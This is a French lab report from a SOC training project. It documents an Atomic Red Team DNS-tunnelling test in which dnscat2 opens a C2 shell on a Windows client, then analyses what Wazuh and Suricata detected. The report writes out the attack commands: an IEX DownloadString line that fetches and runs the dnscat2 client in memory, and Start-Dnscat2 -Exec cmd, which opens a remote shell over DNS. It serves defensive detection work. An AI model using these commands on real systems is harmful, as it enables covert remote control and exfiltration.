# Rapport de Projet — Atomic Red Team T1071.004
## Test #4 : Session C2 complète via DNS (dnscat2)

**Auteur / Analyste :** Ghraba Youssef
**Date :** 25 octobre 2026
**Suite de :** série de tests Atomic Red Team T1071.004 (Tests #1 Volume, #2 Beaconing, #3 Domaine long — déjà réalisés et documentés)
**Techniques MITRE ATT&CK couvertes :** T1071.004 (DNS Tunneling), T1105 (Ingress Tool Transfer), T1059.001 (PowerShell), T1041 (Exfiltration Over C2 Channel)
**Classification :** Interne / Formation

---

## 1. Objectif de cette session

Les trois premiers tests de la série T1071.004 reposaient sur des **simulations unilatérales** : WIN-CLIENT émettait des requêtes DNS vers un domaine de test, sans véritable échange bidirectionnel. Le **Test #4** change de nature : il établit une **vraie session de Command & Control fonctionnelle** à l'aide de l'outil **dnscat2**, avec un canal bidirectionnel permettant à l'attaquant d'exécuter des commandes à distance sur la victime, exclusivement via le protocole DNS.

**Objectif pédagogique :** vérifier que l'infrastructure de détection (Wazuh + Sysmon côté hôte, Suricata + OPNsense côté réseau) capture une attaque C2 réelle et pas seulement un pattern de requêtes simulées, puis produire la documentation d'incident correspondante.

---

## 2. Rappel du test officiel Atomic Red Team

| Champ | Valeur |
|---|---|
| GUID | `e7bf9802-2e78-4db9-93b5-181b7bcd37d7` |
| Plateforme | Windows |
| Description | Lance une session C2 via le protocole DNS ; nécessite un écouteur et des enregistrements DNS configurés au préalable |
| Références | [github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2) (serveur), [github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) (client PowerShell) |

**Paramètres d'entrée :**

| Nom | Description | Type | Valeur par défaut |
|---|---|---|---|
| `Domain` | Domaine configuré pour pointer vers le serveur DNS hébergeant l'écouteur C2 | String | `example.com` |
| `server_ip` | Adresse IP du serveur DNS hébergeant l'écouteur C2 | String | `127.0.0.1` |

**Commande d'attaque officielle (PowerShell) :**

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
```

---

## 3. Architecture mise en place pour le test

<img width="1152" height="90" alt="Capture d&#39;écran 2026-10-30 153710" src="https://github.com/user-attachments/assets/f9078ca0-1033-4023-b030-9999467506f6" />



| Machine | Rôle | IP | Outils installés |
|---|---|---|---|
| OPNsense | Firewall / IDS | 192.168.56.1 | Suricata (règles ET Open + règle custom) |
| WIN-CLIENT | Victime | 192.168.56.61 | Sysmon v15.22, Wazuh Agent |
| SERVER01-CORE | Contrôleur de domaine / DNS | 192.168.56.58 | Sysmon, Wazuh Agent |
| Rocky Linux | Wazuh Manager | 192.168.56.10 | Wazuh Manager, Dashboard |
| Arch Linux | Attaquant (écouteur C2) | 192.168.56.54 | dnscat2, Wireshark, tcpdump |
| Ubuntu | Victime secondaire | 192.168.56.59 | Wazuh Agent (optionnel, non utilisé dans ce test) |


### 3.1 Choix de conception clé — redirection du trafic DNS vers le pare-feu

Toutes les VM reposent sur le même switch interne (`LAN_Net`). Pour que le trafic DNS du tunnel C2 soit visible par les outils de détection réseau, les requêtes DNS de WIN-CLIENT sont dirigées vers **OPNsense (192.168.56.1)**, qui les redirige à son tour vers **Arch Linux (192.168.56.54)** — l'écouteur dnscat2 — via une règle de **Query Forwarding**.

**Pourquoi ce choix :** cela évite de dépendre d'une configuration de Port Mirroring sur Hyper-V (plus complexe à mettre en place) pour permettre à Suricata et Wireshark de capturer le trafic. En faisant transiter chaque requête DNS par le pare-feu avant redirection, celui-ci voit et peut inspecter systématiquement tout le trafic du tunnel.

---

## 4. Reconstruction du laboratoire (étapes préalables)

### 4.1 Nettoyage initial

- Suppression de toutes les zones DNS `dnscat` résiduelles sur SERVER01-CORE.
- Arrêt et désactivation de `systemd-resolved` sur Arch Linux, pour libérer le port 53 nécessaire à l'écouteur dnscat2.
- Suppression de la carte réseau inutile `Guest_Switch` sur OPNsense.
- Vérification de la connectivité entre toutes les VM (ping).

### 4.2 Configuration d'OPNsense

- **Query Forwarding :** redirection du domaine `dnscat.lab.local` vers `192.168.56.54:53`.
- **Suricata :** ajout d'une règle personnalisée `custom-dnscat.rules` ciblant spécifiquement `dnscat.lab.local`.

### 4.3 Configuration d'Arch Linux (attaquant)

- Installation de dnscat2 (serveur Ruby) depuis GitHub.
- Démarrage du serveur avec `--no-cache --security=open`.
- Activation de `tcpdump` en mode promiscuous sur `eth0` pour capture passive de tout le trafic DNS transitant par la machine.

### 4.4 Configuration de la victime (WIN-CLIENT)

- DNS du poste pointé vers OPNsense (`192.168.56.1`).
- Téléchargement prévu du client `dnscat2.ps1`.
- Exécution prévue via PowerShell (session administrateur).

---

## 5. Déroulement de l'attaque — preuves d'exécution

### 5.1 Étape 1 — Téléchargement du payload (T1105)

Sur WIN-CLIENT :

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
```

Cette commande télécharge et exécute en mémoire le script client dnscat2 directement depuis GitHub (technique **T1105 — Ingress Tool Transfer**), sans écrire de fichier sur le disque.

### 5.2 Étape 2 — Difficultés rencontrées au lancement de la session C2

**Première tentative — erreur de syntaxe :**

```powershell
Start-Dnscat2 -Domain "dnscat.lab.local" -DNSServer 192.168.56.1 -NoEncryption -Exec cmd
```

```
Start-Dnscat2 : Cannot bind parameter because parameter 'Domain' is specified more than once.
+ CategoryInfo : InvalidArgument: (:) [Start-Dnscat2], ParameterBindingException
```

**Cause :** un artefact de copier-coller a dupliqué les paramètres de la commande dans le terminal (visible dans la capture : `cmdStart-Dnscat2 -Domain "dnscat...`), entraînant une erreur de liaison de paramètre.

**Deuxième tentative — échec de connexion au serveur :**

```powershell
Start-Dnscat2 -Domain "dnscat.lab.local" -DNSServer 192.168.56.1 -NoEncryption -Exec cmd
```

```
Start-Dnscat2Session : Failed to start session. Ensure your dnscat2 server is set up correctly.
At line:2080 char:23
+ ... alSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $ ...
```

**Cause :** à ce stade, le serveur dnscat2 côté Arch Linux n'était pas encore pleinement opérationnel ou la redirection DNS d'OPNsense n'était pas encore active.

**Troisième tentative — succès :** après re-téléchargement du script et nouvelle exécution de la commande (le téléchargement du payload a d'ailleurs lui-même généré une requête DNS supplémentaire, visible plus loin dans les logs Wazuh), la session C2 s'est établie avec succès.

**Enseignement :** documenter les échecs intermédiaires fait partie intégrante d'un rapport SOC honnête — une attaque réelle rencontre elle aussi des obstacles techniques (latence DNS, redirections mal propagées) avant de réussir, et ces tentatives ratées génèrent elles-mêmes des traces exploitables par la défense.

### 5.3 Étape 3 — Session C2 interactive établie

Une fois la session active, l'attaquant obtient un shell `cmd` interactif sur WIN-CLIENT, intégralement acheminé via des requêtes/réponses DNS. Commandes exécutées à des fins de démonstration :

```
whoami
ipconfig
hostname
dir C:\Users
systeminfo
```

### 5.4 Étape 4 — Capture du trafic d'exfiltration (côté Arch Linux)

```bash
sudo ip link set eth0 promisc on
sudo tcpdump -i eth0 -n port 53 -w /tmp/dnscat2_final.pcap
```

```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C5824 packets captured
5824 packets received by filter
0 packets dropped by kernel
```

```bash
ls -lh /tmp/dnscat2_final.pcap
-rw-r--r-- 1 root root 783K Oct 25 17:56 /tmp/dnscat2_final.pcap
```

✅ **5 824 paquets capturés (783 Ko)** — la totalité des échanges du tunnel DNS (commandes envoyées, résultats encodés renvoyés) a été préservée pour analyse forensique ultérieure dans Wireshark (filtre `dns.qry.name contains "dnscat"`).

Le fichier a ensuite été exfiltré vers le poste d'analyse pour archivage :

```bash
scp root@192.168.56.54:/tmp/dnscat2_final.pcap C:\Users\grimj\Desktop\
```

---

## 6. Résultats de la détection

### 6.1 Détection réseau — Suricata / OPNsense (preuve principale)

**Interface d'administration OPNsense — Détection d'intrusion → Alertes :**

<img width="1917" height="1198" alt="Capture d&#39;écran 2026-10-25 175917" src="https://github.com/user-attachments/assets/4b27687d-9cca-4386-966e-c1d13fab2d4f" />



**Détail d'une alerte (fiche complète) :**



<img width="1917" height="1198" alt="Capture d&#39;écran 2026-10-25 180311" src="https://github.com/user-attachments/assets/0fa07dd0-8e50-4497-bf04-a29c5da5145c" />




**Analyse :** cette alerte provient des règles **ET Open (Emerging Threats)**, et non de la règle personnalisée `custom-dnscat.rules`. C'est un résultat particulièrement intéressant : **la signature structurelle du trafic dnscat2 (format d'encodage DNS, cadence des requêtes) est suffisamment proche de celle du malware bancaire Trickbot** pour déclencher sa règle de détection existante — démonstration que les règles génériques de détection de tunneling DNS couvrent des familles d'outils variées au-delà de leur cible d'origine.

> **Point d'attention relevé pendant le test :** une tentative de vérification via `tail -f /var/log/suricata/fast.log | grep -i dnscat` a échoué (`No such file or directory`), le chemin de log attendu ne correspondant pas à l'emplacement réel des logs Suricata sur cette version d'OPNsense. La détection reste confirmée et consultable de façon fiable via l'interface web (Détection d'intrusion → Alertes), qui a correctement affiché les deux occurrences.

### 6.2 Détection hôte — Wazuh (Sysmon Event ID 22 et événements associés)

**Chronologie des alertes capturées sur WIN-CLIENT (agent GAGNANT-CLIENT) :**




<img width="1888" height="741" alt="Capture d&#39;écran 2026-10-25 180242" src="https://github.com/user-attachments/assets/4cbe9fbb-7bcb-444e-9145-556edfcb462a" />




**Lecture technique :**

- La règle **100200** (niveau 5), identique à celle utilisée dans les tests précédents de la série, capture bien la requête DNS vers `raw.githubusercontent.com` — le téléchargement du payload (T1105). La requête `wdcp.microsoft.com` quelques secondes avant est un artefact normal (Windows Defender Cloud Protection) non lié à l'attaque, utile pour rappeler qu'un analyste SOC doit distinguer bruit et signal.
- Les règles **92032** et **92052** (niveaux 3–4) capturent le lancement d'un shell `cmd.exe` par un processus anormal (PowerShell) — signature classique de l'exécution d'une charge offensive.
- Les règles **67028** et **67024** reflètent l'attribution de privilèges spéciaux à la nouvelle session, cohérente avec une exécution PowerShell en contexte administrateur.

**Constat important :** sur ce test, **Wazuh seul n'a pas généré d'alerte de niveau critique spécifique au tunnel dnscat2 lui-même** (contrairement aux tests #1–#3 où la règle 100204 montait à Level 12). Les événements hôtes restent de niveau 3 à 5 — suffisants pour un triage attentif, mais c'est bien **Suricata côté réseau qui a fourni la confirmation critique et sans ambiguïté du canal C2** (règle Trickbot, SID 2028880). Ce constat illustre un principe central du SOC : **la défense en profondeur et la corrélation multi-source sont indispensables**, un seul capteur pouvant manquer ou sous-évaluer une menace que l'autre détecte clairement.

### 6.3 Vérification du Wazuh Manager — agent `server`

Côté SERVER01-CORE, vérification du bon fonctionnement de l'agent Wazuh après les opérations de nettoyage des zones DNS `dnscat` :

 <img width="1917" height="1198" alt="Capture d&#39;écran 2026-10-25 175814" src="https://github.com/user-attachments/assets/0293e1aa-409b-4ec7-ac7e-fef8be4364e8" />


```
Status   Name       DisplayName
------   ----       -----------
Running  WazuhSvc   Wazuh
```

✅ L'agent Wazuh reste opérationnel après la purge des zones DNS résiduelles du test, confirmant que le nettoyage post-attaque n'a pas affecté la supervision du contrôleur de domaine.

### 6.4 Analyse de propagation — Wazuh Threat Hunting (SERVER01-CORE)

Une recherche élargie dans le module *Threat Hunting* de Wazuh sur SERVER01-CORE (145 événements sur la fenêtre observée) ne fait apparaître que des événements d'authentification normaux : règles **60137** (déconnexion utilisateur Windows) et **60106** (succès de connexion Windows), tous de niveau 3 — aucune trace de requête DNS suspecte ni d'exécution anormale de commande sur le contrôleur de domaine.

✅ **Conclusion :** comme pour les tests précédents de la série, **aucune propagation de l'attaque vers SERVER01-CORE n'est constatée** ; celui-ci agit uniquement comme relais DNS passif via la redirection OPNsense.

---

## 7. Analyse SOC — reconstitution de la kill chain

| Heure | Événement | Source |
|---|---|---|
| 17:43:47 | PowerShell → lancement de cmd.exe (exécution suspecte) | Wazuh (92032 / 92052 / 67028) |
| 17:45:18–19 | Téléchargement du payload dnscat2.ps1 (`raw.githubusercontent.com`) | Wazuh (100200) |
| ~17:45–17:56 | Tentatives successives d'établissement de session (échecs puis succès) | Observation terminal WIN-CLIENT |
| 17:56:18 | Tunnel DNS actif — envoi de données confirmé | Suricata (2028880, x2) |
| ~17:57 | Commandes exécutées via le shell C2 (whoami, ipconfig, etc.) | dnscat2 (session interactive) |
| 17:56 (fenêtre de capture) | 5 824 paquets DNS capturés (783 Ko) | tcpdump (Arch Linux) |

**Mapping MITRE ATT&CK complet de la chaîne d'attaque :**

| Tactique | Technique | Preuve |
|---|---|---|
| Execution | T1059.001 — PowerShell | Lancement de `cmd.exe` via PowerShell (Wazuh 92032/92052) |
| Ingress Tool Transfer | T1105 | Téléchargement de `dnscat2.ps1` depuis GitHub (Wazuh 100200) |
| Command and Control | T1071.004 — DNS Tunneling | Session dnscat2 active (Suricata SID 2028880) |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | Résultats de commandes encodés et renvoyés via DNS |

**Classification :** 🔴 **VRAI POSITIF — Confiance : HAUTE**

---

## 8. Comparaison avec les tests #1 à #3

| Critère | Tests #1–#3 (simulation) | Test #4 (dnscat2) |
|---|---|---|
| Nature | Requêtes DNS sortantes simulées, sans réponse exploitée | Session C2 bidirectionnelle réelle et interactive |
| Infrastructure | Aucune (domaine `nip.io` public) | Serveur dnscat2 + redirection DNS OPNsense + enregistrements dédiés |
| Détection déclenchante | Règle Wazuh personnalisée (100204, Level 12) | Règle Suricata **générique** ET Open (signature Trickbot), Wazuh en soutien seulement (Level 3–5) |
| Réalisme | Pattern reproduit | Attaque C2 fonctionnelle, fidèle à un cas réel |
| Difficulté de mise en place | Faible | Élevée (configuration réseau, redirection DNS, dépendances du serveur dnscat2) |

**Enseignement central :** ce test révèle une asymétrie de détection par rapport aux précédents — c'est le capteur **réseau (Suricata)**, et non la règle hôte personnalisée, qui a fourni la preuve la plus nette du canal C2. Cela renforce la nécessité d'une règle Wazuh dédiée à la signature protocolaire de dnscat2, identifiée comme recommandation prioritaire (voir §10).

---

## 9. Indicateurs de compromission (IOCs)

```
Domaine C2        : dnscat.lab.local
Serveur C2         : 192.168.56.54 (Arch Linux)
Relais DNS         : 192.168.56.1 (OPNsense, Query Forwarding)
Victime             : WIN-CLIENT (192.168.56.61) — Windows 10
Payload distant    : raw.githubusercontent.com/lukebaggett/dnscat2-powershell/.../dnscat2.ps1
Processus           : powershell.exe → cmd.exe
Signature réseau   : ET MALWARE Anchor_DNS Trickbot DNS Commande CnC - Envoi de données (SID 2028880)
Volume de capture  : 5 824 paquets / 783 Ko (/tmp/dnscat2_final.pcap)
Commandes observées: whoami, ipconfig, hostname, dir C:\Users, systeminfo
```

---

## 10. Recommandations

| Priorité | Action |
|---|---|
| 🔴 Immédiat | Isoler WIN-CLIENT du réseau. |
| 🟠 Court terme | Bloquer `*.dnscat.lab.local` et `raw.githubusercontent.com` au niveau d'OPNsense. |
| 🟡 Moyen terme | Créer une règle Wazuh de niveau 12 dédiée à `dnscat.lab.local`, afin de ne plus dépendre uniquement de la détection réseau pour ce canal spécifique. |
| 🟡 Moyen terme | Analyser le PCAP (`/tmp/dnscat2_final.pcap`) dans Wireshark pour extraire et documenter précisément les données exfiltrées (décodage des sous-domaines). |
| 🟡 Moyen terme | Investiguer en détail le processus PowerShell ayant initié la session (PID, chaîne de parenté complète). |
| 🟢 Long terme | Former les utilisateurs et déployer des règles de blocage DNS proactives (liste blanche de domaines, DNS Sinkhole). |
| 🟢 Long terme | Corriger le chemin de log Suricata utilisé pour la supervision en ligne de commande (`/var/log/suricata/fast.log` introuvable sur cette installation OPNsense) afin de fiabiliser la vérification manuelle en complément du dashboard web. |

---

## 11. Leçons apprises

- **La corrélation multi-source est essentielle :** Wazuh seul n'aurait donné que des alertes de niveau 3 à 5, insuffisantes pour qualifier l'incident de critique ; c'est Suricata qui a confirmé sans ambiguïté la présence d'un tunnel C2 actif.
- **Le Query Forwarding d'OPNsense est une solution simple et efficace** pour faire transiter le trafic DNS interne par le pare-feu sans configuration réseau complexe (pas besoin de Port Mirroring Hyper-V).
- **Les règles génériques (ET Open) peuvent détecter des outils inattendus :** la signature Trickbot a intercepté du trafic dnscat2, preuve que la structure d'un tunnel DNS malveillant reste reconnaissable au-delà de sa famille d'origine.
- **Les échecs d'exécution font partie du signal :** les tentatives ratées de `Start-Dnscat2` (erreurs de paramètres, échecs de connexion) ont elles-mêmes généré des événements PowerShell/cmd exploitables par la détection, avant même l'établissement réussi du tunnel.
- **La documentation d'incident est aussi importante que la détection elle-même** — consigner précisément les horodatages, IOCs et chaîne de techniques MITRE permet de transformer un test technique en véritable exercice de méthodologie SOC.

---

## 12. Conclusion

Ce quatrième test clôt la série T1071.004 sur une démonstration réaliste et aboutie : contrairement aux simulations des Tests #1 à #3, le Test #4 a établi une **véritable session de Command & Control fonctionnelle** via dnscat2, avec exécution de commandes à distance et exfiltration de résultats encodés en DNS. L'infrastructure du laboratoire (Wazuh, Sysmon, Suricata, OPNsense) a su détecter cette attaque de bout en bout — la détection réseau se révélant ici déterminante là où la détection hôte seule serait restée insuffisante.

Le laboratoire est désormais validé sur l'ensemble de la chaîne de détection DNS Tunneling (volume, beaconing, longueur de domaine, et session C2 complète) et constitue une base solide pour aborder d'autres scénarios : Kerberoasting, Pass-the-Hash, C2 via HTTPS.

---

## 13. Synthèse de la série de tests T1071.004 (vue d'ensemble)

| Test | Nom | Détection clé | Statut |
|---|---|---|---|
| #1 | High Volume DNS Requests | Wazuh (100204) + Suricata (100300), CV = 10.7 % | ✅ Réalisé |
| #2 | Balise DNS régulière (Beaconing) | Wazuh (100204), kill chain complète reconstituée | ✅ Réalisé |
| #3 | Requête DNS à domaine long | Wazuh (100202/100300, règle créée a posteriori) | ✅ Réalisé |
| #4 | Session DNS C2 complète (dnscat2) | **Suricata (ET MALWARE Trickbot, SID 2028880)** | ✅ Réalisé |

**Bilan global :** quatre variantes de la technique T1071.004 testées, de la plus simple (volume brut) à la plus sophistiquée (session C2 interactive), chacune révélant des angles de détection complémentaires — threshold, analyse temporelle (CV), longueur de domaine, et signature protocolaire réseau.

---

*Rapport rédigé dans le cadre d'un projet d'apprentissage personnel autour du framework Atomic Red Team, destiné au portfolio GitHub — clôture de la série de tests T1071.004.*
